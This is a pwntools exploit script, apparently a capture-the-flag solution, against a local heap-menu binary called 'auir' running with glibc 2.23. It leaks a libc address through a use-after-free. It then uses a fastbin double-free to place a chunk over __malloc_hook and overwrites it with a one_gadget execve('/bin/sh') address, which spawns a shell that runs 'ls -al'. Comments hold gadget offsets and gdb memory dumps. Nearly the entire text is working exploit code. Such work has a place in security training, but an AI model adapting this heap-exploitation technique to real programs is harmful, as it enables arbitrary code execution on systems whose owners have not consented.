from pwn import *

r=process('./auir',env={"LD_PRELOAD": "./libc-2.23.so"})
libc = ELF('libc-2.23.so')
#r=process('./auir')
#libc = ELF('libc-2.24_64.so')
gdb.attach(r)

def make(content,size):
	r.sendline("1")
	r.recvuntil(">>")
	size=int(size)
	r.sendline(str(size))
	r.recvuntil(">>")
	r.sendline(content)
	r.recvuntil(">>")


def free(pos):
	r.sendline("2")
	r.recvuntil(">>")
	r.sendline(str(pos))
	r.recvuntil(">>")

def fix(content,size,pos):
	r.sendline("3")
	r.recvuntil(">>")
	r.sendline(str(pos))
	r.recvuntil(">>")	
	r.sendline(str(int(size)))
	r.recvuntil(">>")
	r.sendline(content)
	r.recvuntil(">>")

def show(pos):
	r.sendline("4")
	r.recvuntil(">>")
	r.sendline(str(pos))
	r.recvuntil("\n")
	ret=r.recvuntil("|")
	ret=u64(ret[:-1])
	#print "out : "+hex(ret)
	r.recvuntil(">>")
	return ret
malloc_got=0x0000000000605038
r.recvuntil(">>")
#first leak libc
make("A"*40,0x80) #0
make("B"*40,0x80) #1
free(0)
leaked=show(0)
free(1)
# 0x45216	execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a	execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf0274	execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1117	execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

malloc=leaked-3410504
#malloc=leaked-3268136
base=malloc-libc.symbols['malloc']
system=base+libc.symbols['system']
malloc_hook=base+libc.symbols['__malloc_hook']
one=base+0xf0274
sh=0x7f99c7d2fd17-0x7f99c7be8390+system
print "leaked libc : "+hex(leaked)
print "malloc : "+hex(malloc)
print "system : "+hex(system)
print "malloc hook : "+hex(malloc_hook)
print "sh : "+hex(sh)
print "one : "+hex(one)
#pause()
#exploit
make("D"*40,0x60) #2
make("E"*40,0x60) #3
make("F"*40,0x100)#4

#0x605300:	0x0000000000000000	0x0000000000000000
#0x605310:	0x00000000016d9c20	0x00000000016d9cb0
#0x605320:	0x00000000016d9c20	0x00000000016d9c90
#0x605330:	0x00000000016d9d00	0x0000000000000000
#0x605340:	0x0000000000000000	0x0000000000000000

print "[+] Exploit fastbin :"
free(3)
free(2)
free(3)
#(0x70)     fastbin[5]: 0x2462c80 --> 0x2462c10 --> 0x2462c80 (overlap chunk with 0x2462c80(freed) )
pause()

#-0x23 is to use the 0x7f as the chunk header
make(p64(malloc_hook-0x23),0x60)#3
make("G"*40,0x60)#2
make("H"*40,0x60)#3

print "[+] Before adding fake table :"
# (0x70)     fastbin[5]: 0x7f228f1e8acd (size error (0x78)) --> 0x228eecc240000000 (invaild memory)

pause()
#"A"*3 is the padding
make("A"*3+p64(one)*4,0x60)
print "[+] After adding fake table :"
# pause()
free(0)
r.sendline("2")
sleep(1)
r.sendline("0")
sleep(1)
r.sendline("ls -al")
r.interactive()

# leaked libc : 0x7f228f1e8b58
# malloc : 0x7f228eecad30
# system : 0x7f228ee8f450
# malloc hook : 0x7f228f1e8af0
# sh : 0x7f228efd6dd7
# one : 0x7f228ef40274
# [+] Exploit fastbin :
# [*] Paused (press any to continue)
# [+] Before adding fake table :
# [*] Paused (press any to continue)
# [+] After adding fake table :
# [*] Paused (press any to continue)



# gdb-peda$ x/40gx 0x7f228f1e8abd
# 0x7f228f1e8abd <_IO_wide_data_0+285>:	0x0000000000000000	0x0000000000000000
# 0x7f228f1e8acd <_IO_wide_data_0+301>:	0x228f1e4f00000000	0x000000000000007f
# 0x7f228f1e8add:	0x228ef40274414141	0x228ef4027400007f
# 0x7f228f1e8aed <__realloc_hook+5>:	0x228ef4027400007f	0x228ef4027400007f
# 0x7f228f1e8afd:	0x000000000a00007f	0x0000000000000000
# 0x7f228f1e8b0d <main_arena+13>:	0x0000000000000000	0x0000000000000000
# 0x7f228f1e8b1d <main_arena+29>:	0x0000000000000000	0x0000000000000000
# 0x7f228f1e8b2d <main_arena+45>:	0xc240000000000000	0x0000000000228eec
# 0x7f228f1e8b3d <main_arena+61>:	0x0000000000000000	0x0000000000000000
# 0x7f228f1e8b4d <main_arena+77>:	0x0000000000000000	0x0001277e00000000
# 0x7f228f1e8b5d <main_arena+93>:	0x0000000000000000	0x228f1e8b58000000
# 0x7f228f1e8b6d <main_arena+109>:	0x228f1e8b5800007f	0x228f1e8b6800007f
# 0x7f228f1e8b7d <main_arena+125>:	0x228f1e8b6800007f	0x228f1e8b7800007f
# 0x7f228f1e8b8d <main_arena+141>:	0x228f1e8b7800007f	0x228f1e8b8800007f
# 0x7f228f1e8b9d <main_arena+157>:	0x228f1e8b8800007f	0x228f1e8b9800007f
# 0x7f228f1e8bad <main_arena+173>:	0x228f1e8b9800007f	0x228f1e8ba800007f
# 0x7f228f1e8bbd <main_arena+189>:	0x228f1e8ba800007f	0x228f1e8bb800007f
# 0x7f228f1e8bcd <main_arena+205>:	0x228f1e8bb800007f	0x228f1e8bc800007f
# 0x7f228f1e8bdd <main_arena+221>:	0x228f1e8bc800007f	0x228f1e8bd800007f
# 0x7f228f1e8bed <main_arena+237>:	0x228f1e8bd800007f	0x228f1e8be800007f


# gdb-peda$ x/40gx 0x7f228f1e8acd
# 0x7f228f1e8acd <_IO_wide_data_0+301>:	0x228f1e4f00000000	0x000000000000007f
# 0x7f228f1e8add:	0x228ef40274414141	0x228ef4027400007f
# 0x7f228f1e8aed <__realloc_hook+5>:	0x228ef4027400007f	0x228ef4027400007f
# 0x7f228f1e8afd:	0x000000000a00007f	0x0000000000000000
# 0x7f228f1e8b0d <main_arena+13>:	0x0000000000000000	0x0000000000000000
# 0x7f228f1e8b1d <main_arena+29>:	0x0000000000000000	0x0000000000000000
# 0x7f228f1e8b2d <main_arena+45>:	0xc240000000000000	0x0000000000228eec
# 0x7f228f1e8b3d <main_arena+61>:	0x0000000000000000	0x0000000000000000
# 0x7f228f1e8b4d <main_arena+77>:	0x0000000000000000	0x0001277e00000000
# 0x7f228f1e8b5d <main_arena+93>:	0x0000000000000000	0x228f1e8b58000000
# 0x7f228f1e8b6d <main_arena+109>:	0x228f1e8b5800007f	0x228f1e8b6800007f
# 0x7f228f1e8b7d <main_arena+125>:	0x228f1e8b6800007f	0x228f1e8b7800007f
# 0x7f228f1e8b8d <main_arena+141>:	0x228f1e8b7800007f	0x228f1e8b8800007f
# 0x7f228f1e8b9d <main_arena+157>:	0x228f1e8b8800007f	0x228f1e8b9800007f
# 0x7f228f1e8bad <main_arena+173>:	0x228f1e8b9800007f	0x228f1e8ba800007f
# 0x7f228f1e8bbd <main_arena+189>:	0x228f1e8ba800007f	0x228f1e8bb800007f
# 0x7f228f1e8bcd <main_arena+205>:	0x228f1e8bb800007f	0x228f1e8bc800007f
# 0x7f228f1e8bdd <main_arena+221>:	0x228f1e8bc800007f	0x228f1e8bd800007f
# 0x7f228f1e8bed <main_arena+237>:	0x228f1e8bd800007f	0x228f1e8be800007f
# 0x7f228f1e8bfd <main_arena+253>:	0x228f1e8be800007f	0x228f1e8bf800007f
